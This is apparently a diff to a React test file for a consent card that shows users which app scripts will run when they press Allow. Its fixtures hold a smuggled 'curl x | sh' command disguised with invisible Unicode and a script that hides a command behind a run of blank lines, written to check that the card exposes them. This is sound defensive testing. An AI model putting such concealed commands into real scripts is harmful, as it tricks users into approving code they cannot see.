@@ -2,14 +2,14 @@
 import { emitBotTestNotification, installBotTestIpc } from "../main/bots/test-dom";
 import assert from "node:assert/strict";
 import { afterEach, test } from "node:test";
-import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
+import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
 import { Toaster } from "../components/ui";
 import type { DesignAppConsentRequest, DesignAppsSnapshot, DesignAppStatus } from "../shared/design-app";
 import {
-  DesignAppConsentCard,
+  DesignAppConsentCards,
   DesignAppProblemToasts,
   resetDesignAppConsentForTests,
-  useDesignAppConsent,
+  useDesignAppConsents,
 } from "./design-app-consent";
 
 afterEach(() => {
@@ -42,8 +42,8 @@ function launch(overrides: Partial<LaunchRequest> = {}): LaunchRequest {
 }
 
 function ChatSlot({ chatId }: { chatId: string }) {
-  const request = useDesignAppConsent(chatId);
-  return request ? <DesignAppConsentCard key={request.requestId} request={request} /> : <p>No card for {chatId}</p>;
+  const requests = useDesignAppConsents(chatId);
+  return requests.length > 0 ? <DesignAppConsentCards requests={requests} /> : <p>No card for {chatId}</p>;
 }
 
 function ask(request: DesignAppConsentRequest) {
@@ -100,6 +100,65 @@ test("a script, app root or package name with a bidi override or a Hangul filler
   const text = (await card()).textContent ?? "";
   for (const hidden of ["‮", "ㅤ", "​", "⁦"]) assert.equal(text.includes(hidden), false, `U+${hidden.codePointAt(0)!.toString(16)}`);
   for (const escape of ["apps/\\u{202E}web", "acme\\u{3164}web", "vite\\u{200B} && curl x | sh\\u{2066}"]) assert.ok(text.includes(escape), escape);
+});
+
+test("a script with blank lines in the middle shows every line break, the collapsed count, the text after it and its line count", async () => {
+  installBotTestIpc();
+  render(<ChatSlot chatId="chat-1" />);
+  ask(
+    launch({
+      scripts: [
+        { name: "dev", text: `echo hidden > pwned.txt &&${"\n".repeat(40)}node server.mjs` },
+        { name: "postinstall (.)", text: "node scripts/setup.js" },
+      ],
+    }),
+  );
+  const shown = await card();
+  const text = shown.textContent ?? "";
+  assert.ok(text.includes("echo hidden > pwned.txt &&↵"), "the break is marked");
+  assert.ok(text.includes("[39 blank lines]"));
+  assert.ok(text.includes("node server.mjs"), "the line after the blank run is on the card, not scrolled away");
+  assert.ok(within(shown).getByText("Script dev · 41 lines"));
+  assert.ok(within(shown).getByText("Script postinstall (.)"), "a one-line script has no count");
+});
+
+test("the card's details scroll inside it with a cue, and Allow and Not now stay outside the scrolling part", async () => {
+  installBotTestIpc();
+  render(<ChatSlot chatId="chat-1" />);
+  ask(launch());
+  const shown = await card();
+  const details = within(shown).getByRole("region", { name: "What Allow runs" });
+  assert.ok(details.textContent?.includes("pnpm run dev"));
+  assert.equal(details.tabIndex, 0, "the keyboard can scroll it");
+  for (const name of ["Allow", "Not now"]) assert.equal(details.contains(within(shown).getByRole("button", { name })), false, name);
+  assert.equal(within(shown).queryByText("Scroll for more"), null, "nothing to scroll");
+  Object.defineProperty(details, "scrollHeight", { configurable: true, value: 1_000 });
+  Object.defineProperty(details, "clientHeight", { configurable: true, value: 200 });
+  fireEvent.scroll(details);
+  assert.ok(await within(shown).findByText("Scroll for more"), "the end is out of view");
+  details.scrollTop = 800;
+  fireEvent.scroll(details);
+  await waitFor(() => assert.equal(within(shown).queryByText("Scroll for more"), null));
+});
+
+test("two cards for one chat both show, each answers its own request, and closing one leaves the other", async () => {
+  const calls = installBotTestIpc({ "designApp:consentAnswer": () => true });
+  render(<ChatSlot chatId="chat-1" />);
+  ask(launch({ requestId: "r1", appRoot: "apps/a", packageName: undefined }));
+  ask(launch({ requestId: "r2", appRoot: "apps/b", packageName: undefined }));
+  await waitFor(() => assert.equal(screen.getAllByRole("group", { name: /^Run .* app/u }).length, 2));
+  const [first, second] = screen.getAllByRole("group", { name: /^Run .* app/u });
+  assert.ok(first!.textContent?.includes("apps/a"), "oldest first");
+  assert.ok(second!.textContent?.includes("apps/b"));
+  fireEvent.click(within(second!).getByRole("button", { name: "Allow" }));
+  await waitFor(() => assert.equal(screen.getAllByRole("group", { name: /^Run .* app/u }).length, 1));
+  assert.ok((await card()).textContent?.includes("apps/a"));
+  assert.deepEqual(
+    calls.filter((call) => call.channel === "designApp:consentAnswer").map((call) => call.args),
+    [["r2", "allow"]],
+  );
+  act(() => emitBotTestNotification("designApp:consentClosed", { requestId: "r1" }));
+  assert.ok(screen.getByText("No card for chat-1"));
 });
 
 test("a choose request says Allow saves the choice to .aiden/canvas.json", async () => {
